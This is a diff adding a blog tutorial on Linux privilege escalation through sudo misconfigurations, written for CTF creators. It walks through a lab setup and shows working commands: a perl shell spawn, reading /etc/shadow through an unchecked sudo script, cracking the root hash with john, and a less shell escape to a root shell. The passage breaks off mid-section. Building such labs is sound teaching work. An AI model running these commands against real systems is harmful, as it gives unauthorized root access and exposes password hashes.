@@ -1,0 +1,1132 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <title>Linux Privilege Escalation - Sudo for CTF Creators - pwnlog</title><meta name="Description" content="IT Security"><meta property="og:url" content="//localhost:1313/linux-privesc-sudo/">
+  <meta property="og:site_name" content="pwnlog">
+  <meta property="og:title" content="Linux Privilege Escalation - Sudo for CTF Creators">
+  <meta property="og:description" content="Sudo or uid 0? (?_?)">
+  <meta property="og:locale" content="en">
+  <meta property="og:type" content="article">
+    <meta property="article:section" content="posts">
+    <meta property="article:published_time" content="2021-12-28T11:33:00+08:00">
+    <meta property="article:modified_time" content="2021-12-28T11:33:00+08:00">
+    <meta property="article:tag" content="Privilege Escalation">
+    <meta property="article:tag" content="Sudo">
+    <meta property="article:tag" content="Noexec Tag">
+    <meta property="article:tag" content="Ld_preload">
+    <meta property="article:tag" content="Ld_library_path">
+    <meta property="article:tag" content="Setenv">
+    <meta property="og:image" content="//localhost:1313/logo.png">
+
+  <meta name="twitter:card" content="summary_large_image">
+  <meta name="twitter:image" content="//localhost:1313/logo.png">
+  <meta name="twitter:title" content="Linux Privilege Escalation - Sudo for CTF Creators">
+  <meta name="twitter:description" content="Sudo or uid 0? (?_?)">
+<meta name="application-name" content="pwnlog">
+<meta name="apple-mobile-web-app-title" content="pwnlog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="//localhost:1313/linux-privesc-sudo/" /><link rel="prev" href="//localhost:1313/linux-privesc-suid-segid/" /><link rel="next" href="//localhost:1313/linux-privesc-ssh/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
+        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Linux Privilege Escalation - Sudo for CTF Creators",
+        "inLanguage": "en",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/\/localhost:1313\/linux-privesc-sudo\/"
+        },"image": ["\/\/localhost:1313\/images\/Apple-Devices-Preview.png"],"genre": "posts","keywords": "privilege escalation, sudo, noexec tag, ld_preload, ld_library_path, setenv, visudo, shell escape sequences, vulnerable sudo, defend","wordcount":  2478 ,
+        "url": "\/\/localhost:1313\/linux-privesc-sudo\/","datePublished": "2021-12-28T11:33:00+08:00","dateModified": "2021-12-28T11:33:00+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "xxxx","logo": "\/\/localhost:1313\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "pwnlog"
+            },"description": ""
+    }
+    </script></head>
+    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="pwnlog"><span class="header-title-pre">@</span>pwnlog<span class="header-title-post">:</span></a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/"> ~/ </a><a class="menu-item" href="/posts/"> ~/posts </a><a class="menu-item" href="/tags/"> ~/tags </a><a class="menu-item" href="/categories/"> ~/categories </a><a class="menu-item" href="/about/"> ~/about </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+                </a></div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="pwnlog"><span class="header-title-pre">@</span>pwnlog<span class="header-title-post">:</span></a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="Search titles or contents..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="Search">
+                            <i class="fas fa-search fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="Clear">
+                            <i class="fas fa-times-circle fa-fw" aria-hidden="true"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin" aria-hidden="true"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        Cancel
+                    </a>
+                </div><a class="menu-item" href="/" title="">~/</a><a class="menu-item" href="/posts/" title="">~/posts</a><a class="menu-item" href="/tags/" title="">~/tags</a><a class="menu-item" href="/categories/" title="">~/categories</a><a class="menu-item" href="/about/" title="">~/about</a><a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
+                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
+            </a></div>
+    </div>
+</header><div class="search-dropdown desktop">
+        <div id="search-dropdown-desktop"></div>
+    </div>
+    <div class="search-dropdown mobile">
+        <div id="search-dropdown-mobile"></div>
+    </div><main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">Contents</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">Linux Privilege Escalation - Sudo for CTF Creators</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel="author" class="author"><i class="fas fa-user-circle fa-fw" aria-hidden="true"></i>pwnlog</a></span>&nbsp;<span class="post-category">included in <a href="/categories/linux-privilege-escalation/"><i class="far fa-folder fa-fw" aria-hidden="true"></i>Linux Privilege Escalation</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="2021-12-28">2021-12-28</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;2478 words&nbsp;
+                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;12 minutes&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  data-kept="">
+                <div class="details-summary toc-title">
+                    <span>Contents</span>
+                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#sudo">Sudo</a>
+      <ul>
+        <li><a href="#visudo">Visudo</a></li>
+        <li><a href="#sudo-syntax">Sudo Syntax</a>
+          <ul>
+            <li><a href="#sudo-syntax---user-privilege-lines">Sudo Syntax - User Privilege Lines</a></li>
+            <li><a href="#sudo-syntax---group-privilege-lines">Sudo Syntax - Group Privilege Lines</a></li>
+          </ul>
+        </li>
+        <li><a href="#sudo-man-page">Sudo Man Page</a></li>
+      </ul>
+    </li>
+    <li><a href="#privilege-escalation-via-known-passwords">Privilege Escalation via Known Passwords</a></li>
+    <li><a href="#privilege-escalation-via-sudo-as-another-user">Privilege Escalation via Sudo As Another User</a></li>
+    <li><a href="#privilege-escalation-via-abusing-intended-functionality">Privilege Escalation via Abusing Intended Functionality</a></li>
+    <li><a href="#privilege-escalation-via-nopasswd">Privilege Escalation via NOPASSWD</a></li>
+    <li><a href="#privilege-escalation-via-setenv">Privilege Escalation via SETENV</a></li>
+    <li><a href="#privilege-escalation-via-ld_preload">Privilege Escalation via LD_PRELOAD</a></li>
+    <li><a href="#privilege-escalation-via-ld_library_path">Privilege Escalation via LD_LIBRARY_PATH</a></li>
+    <li><a href="#privilege-escalation-via-shell-escape-sequences">Privilege Escalation via Shell Escape Sequences</a></li>
+    <li><a href="#privilege-escalation-via-vulnerable-sudo">Privilege Escalation via Vulnerable Sudo</a></li>
+    <li><a href="#defense-via-noexec-tag">Defense via NOEXEC Tag</a></li>
+    <li><a href="#sudo-defense">Sudo Defense</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="sudo">Sudo</h1>
+<p>Sudo can have various misconfigurations, which can lead to security vulnerabilities. It is a critical tool that allows authorized users to execute commands as the superuser or another specified user, in accordance with the security policy. These misconfigurations can range from having valid credentials to potential code hijacking.</p>
+<p>Sudo permits an authorized user to execute a command as the superuser or another specified user, in accordance with the security policy. The default security policy is defined by the sudoers file, which is configured through <code>/etc/sudoers</code> or via LDAP.</p>
+<p>The security policy dictates how a user may utilize the sudo command.</p>
+<p>The sudoers file can be edited using the <code>visudo</code> command to ensure proper syntax and prevent errors.</p>
+<h2 id="visudo">Visudo</h2>
+<p>visudo locks the sudoers file against multiple simultaneous edits, provides basic sanity checks, and checks for parse errors. If the sudoers file is currently being edited you will receive a message to try again later.</p>
+<p>visudo parses the sudoers file after the edit and will not save the changes if there is a syntax error.</p>
+<p>We can change the text editor for the terminal using this command:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo update-alternatives --config editor
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Learn more about visudo by reading its manual:
+<a href="https://www.sudo.ws/docs/man/visudo.man/" target="_blank" rel="noopener noreffer ">https://www.sudo.ws/docs/man/visudo.man/</a></p>
+<h2 id="sudo-syntax">Sudo Syntax</h2>
+<p>The sudo syntax is the following:</p>
+<ul>
+<li>user host=(user) command</li>
+<li>user host=(user) tag: command</li>
+<li>user host=(user:group) tag: command</li>
+<li>user host=(user:group) tag_1:tag_2: command_1, command_2</li>
+<li>%group host=(user) command</li>
+<li>%group host=(user) tag: command</li>
+<li>%group host=(user:group) tag: command</li>
+<li>%group host=(user:group) tag_1:tag_2: command_1, command_2</li>
+</ul>
+<p>Note: You can use ALL to specify the following:</p>
+<ul>
+<li>If ALL is declared in the host field, then ALL hosts will be allowed.</li>
+<li>If ALL is declared in the user field, then ALL users will be allowed.</li>
+<li>If ALL is declared in the group field, then ALL groups will be allowed.</li>
+<li>If ALL is declared in the tag field, it doesn&rsquo;t end with colons (:) and ALL commands will be allowed.</li>
+</ul>
+<h3 id="sudo-syntax---user-privilege-lines">Sudo Syntax - User Privilege Lines</h3>
+<p>Examples:</p>
+<ul>
+<li><code>root</code> ALL=(ALL:ALL) ALL: The rule will apply to (root).</li>
+<li>root <code>ALL</code>=(ALL:ALL) ALL: This rule applies to all hosts.</li>
+<li>root ALL=(<code>ALL</code>:ALL) ALL: The root user can run commands as all users.</li>
+<li>root ALL=(ALL:<code>ALL</code>) ALL: The root user can run commands as all groups.</li>
+<li>root ALL=(ALL:ALL) <code>ALL</code>: This rule applies to all commands.</li>
+</ul>
+<p>This means that our root user can run any command using sudo, as long as they provide their password.</p>
+<h3 id="sudo-syntax---group-privilege-lines">Sudo Syntax - Group Privilege Lines</h3>
+<p>Names beginning with a &lsquo;%&rsquo; indicate group names:</p>
+<ul>
+<li>%admin ALL=(ALL) ALL</li>
+<li>%sudo ALL=(ALL:ALL) ALL</li>
+</ul>
+<p>Here, we can see that the admin group can execute any command as any user on any host. Similarly, the sudo group has the same privileges but can execute as any group as well.</p>
+<h2 id="sudo-man-page">Sudo Man Page</h2>
+<p>Learn more about sudo by reading the documentation:
+<a href="https://www.sudo.ws/docs/man_all/" target="_blank" rel="noopener noreffer ">https://www.sudo.ws/docs/man_all/</a></p>
+<h1 id="privilege-escalation-via-known-passwords">Privilege Escalation via Known Passwords</h1>
+<p>If we know the current user&rsquo;s password we can escalate privileges by switching the root user with sudo:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ sudo su
+</span></span><span class="line"><span class="cl"><span class="o">[</span>sudo<span class="o">]</span> password <span class="k">for</span> user: 
+</span></span><span class="line"><span class="cl">root@pwn:/home/user# whoami
+</span></span><span class="line"><span class="cl">root
+</span></span><span class="line"><span class="cl">root@pwn:/home/user# 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="privilege-escalation-via-sudo-as-another-user">Privilege Escalation via Sudo As Another User</h1>
+<p>We&rsquo;ll try to escalate from one user to another user. We will start by adding a new user to the system:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo adduser user --shell /bin/bash --home /home/user --gecos <span class="s1">&#39;&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Let&rsquo;s edit the sudo configuration file with the following command:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo visudo
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Add the following configuration:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user <span class="nv">ALL</span><span class="o">=(</span>user:ALL<span class="o">)</span> NOPASSWD: /usr/bin/perl
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Switch to the <code>user</code>:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ su user
+</span></span><span class="line"><span class="cl">Password: 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>List the sudo configuration with the option <code>-l</code> which means list:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:/home/user$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> user on ubuntu:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User user may run the following commands on ubuntu:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>low : ALL<span class="o">)</span> NOPASSWD: /usr/bin/perl
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>In GTFOBins, we can see how this can be abused to escalate privileges:
+<img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://gtfobins.github.io/gtfobins/perl/#sudo"
+        data-srcset="https://gtfobins.github.io/gtfobins/perl/#sudo, https://gtfobins.github.io/gtfobins/perl/#sudo 1.5x, https://gtfobins.github.io/gtfobins/perl/#sudo 2x"
+        data-sizes="auto"
+        alt="https://gtfobins.github.io/gtfobins/perl/#sudo"
+        title="Perl Sudo" /></p>
+<p>Now let&rsquo;s execute the program as that specific user:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:/home/user$ sudo -u user /usr/bin/perl -e <span class="s1">&#39;exec &#34;/bin/bash&#34;;&#39;</span>
+</span></span><span class="line"><span class="cl">user@pwn:~$ whoami
+</span></span><span class="line"><span class="cl">user:
+</span></span><span class="line"><span class="cl">user@pwn:~$ 
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>The command above spawns a <code>bash</code> shell as the user.</p>
+<h1 id="privilege-escalation-via-abusing-intended-functionality">Privilege Escalation via Abusing Intended Functionality</h1>
+<p>Edit the sudo configuration file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo visudo
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Create the following scripts, the problem with this script is that it doesn&rsquo;t verify user input:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ cat /home/user/input.sh
+</span></span><span class="line"><span class="cl"><span class="c1">#!/bin/bash</span>
+</span></span><span class="line"><span class="cl"> 
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">cat <span class="nv">$1</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo</span> <span class="s2">&#34;Welcome </span><span class="si">${</span><span class="nv">x</span><span class="si">}</span><span class="s2">!&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Add the <code>rbash</code> sudo configuration:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user <span class="nv">ALL</span><span class="o">=(</span>ALL:ALL<span class="o">)</span> NOPASSWD: /home/user/input.sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>List the sudo configuration:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> user on ubuntu:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User user may run the following commands on ubuntu:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL : ALL<span class="o">)</span> ALL
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL : ALL<span class="o">)</span> NOPASSWD: /home/user/input.sh
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>If there&rsquo;s a program that lets we specify its configuration (such as apache2) and prints on screen a syntax error and an invalid command, we may be able to see sensitive information:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ sudo /home/user/input.sh /etc/shadow
+</span></span><span class="line"><span class="cl">root:<span class="nv">$6$xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span>:18982:0:99999:7:::
+</span></span><span class="line"><span class="cl">daemon:*:18858:0:99999:7:::
+</span></span><span class="line"><span class="cl">bin:*:18858:0:99999:7:::
+</span></span><span class="line"><span class="cl">sys:*:18858:0:99999:7:::
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Add this hash to a file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ <span class="nb">echo</span> <span class="s1">&#39;$6$xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx&#39;</span> &gt; hash.txt
+</span></span><span class="line"><span class="cl">user@pwn:~$ cat hash.txt 
+</span></span><span class="line"><span class="cl"><span class="nv">$6$xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now we can crack the hash with a password recovery tool:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">❯ john --wordlist<span class="o">=</span>/usr/share/wordlists/rockyou.txt hash.txt
+</span></span><span class="line"><span class="cl">Using default input encoding: UTF-8
+</span></span><span class="line"><span class="cl">Loaded <span class="m">1</span> password <span class="nb">hash</span> <span class="o">(</span>sha512crypt, crypt<span class="o">(</span>3<span class="o">)</span> <span class="nv">$6</span>$ <span class="o">[</span>SHA512 128/128 AVX 2x<span class="o">])</span>
+</span></span><span class="line"><span class="cl">Cost <span class="m">1</span> <span class="o">(</span>iteration count<span class="o">)</span> is <span class="m">5000</span> <span class="k">for</span> all loaded hashes
+</span></span><span class="line"><span class="cl">Will run <span class="m">8</span> OpenMP threads
+</span></span><span class="line"><span class="cl">Press <span class="s1">&#39;q&#39;</span> or Ctrl-C to abort, almost any other key <span class="k">for</span> status
+</span></span><span class="line"><span class="cl">pass123          <span class="o">(</span>?<span class="o">)</span>
+</span></span><span class="line"><span class="cl">1g 0:00:00:01 DONE <span class="o">(</span>2021-12-20 18:35<span class="o">)</span> 0.9345g/s 5263p/s 5263c/s 5263C/s allison1..katana
+</span></span><span class="line"><span class="cl">Use the <span class="s2">&#34;--show&#34;</span> option to display all of the cracked passwords reliably
+</span></span><span class="line"><span class="cl">Session completed.
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>We know the password, let&rsquo;s switch to the root user:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">su root
+</span></span></code></pre></td></tr></table>
+</div>
+</div><h1 id="privilege-escalation-via-nopasswd">Privilege Escalation via NOPASSWD</h1>
+<p>Edit the sudo configuration file:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo visudo
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Sudo configuration might allow a user to execute some command with another user&rsquo;s privileges without knowing the password.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user:  <span class="nv">ALL</span> <span class="o">=</span> NOPASSWD: /usr/bin/less
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>List the sudo configuration:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span><span class="lnt">7
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> user on ubuntu:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User user may run the following commands on ubuntu:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>ALL : ALL<span class="o">)</span> ALL
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/less
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Run less with sudo:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">sudo /usr/bin/less /etc/shadow
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Escape from less with:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">!/bin/bash
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Now we will have a root shell:</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-shell" data-lang="shell"><span class="line"><span class="cl">user@pwn:~$ sudo /usr/bin/less /etc/shadow
+</span></span><span class="line"><span class="cl">root@pwn:/home/user# id
+</span></span><span class="line"><span class="cl"><span class="nv">uid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>0<span class="o">(</span>root<span class="o">)</span>
+</span></span><span class="line"><span class="cl">root@pwn:/home/user# whoami
